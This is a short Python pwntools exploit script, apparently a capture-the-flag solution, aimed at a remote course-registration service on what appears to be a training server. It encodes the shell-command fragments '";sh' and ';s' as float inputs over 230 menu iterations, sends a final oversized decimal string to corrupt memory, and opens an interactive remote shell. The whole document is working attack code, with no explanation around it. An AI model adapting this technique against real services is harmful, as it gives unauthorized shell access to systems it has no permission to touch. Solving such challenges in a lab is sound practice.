#!/usr/bin/env python3
from pwn import *
import struct

HOST = "vm.daotao.antoanso.org"
PORT = 33172
context.log_level = "info"


def main():
    io = remote(HOST, PORT, timeout=10)

    io.sendlineafter(b'your name?', b'di' * 25)
    io.sendlineafter(b'student id: ', b'+')

    for i in range(230):
        io.sendlineafter(b'is this course? > ', b'4')
        io.sendlineafter(b'take it? > ', str(ord('"')).encode())

        if i == 47:
            value = struct.unpack('<f', b'";sh')[0]
        else:
            one_byte = p8((i + ord('!')) & 0xff)
            value = struct.unpack('<f', b';s' + one_byte + b'\x00')[0]

        io.sendlineafter(b'that course? > ', str(value).encode())
        io.sendlineafter(b'course? (y/n) > ', b'y')

    io.sendlineafter(b'is this course? > ', b'1')
    io.sendlineafter(b'take it? > ', b'1')
    io.sendlineafter(b'that course? > ', b'0.' + b'0' * 0x100 + b'1')
    io.sendlineafter(b'course? (y/n) > ', b'n')

    io.interactive()


if __name__ == "__main__":
    main()
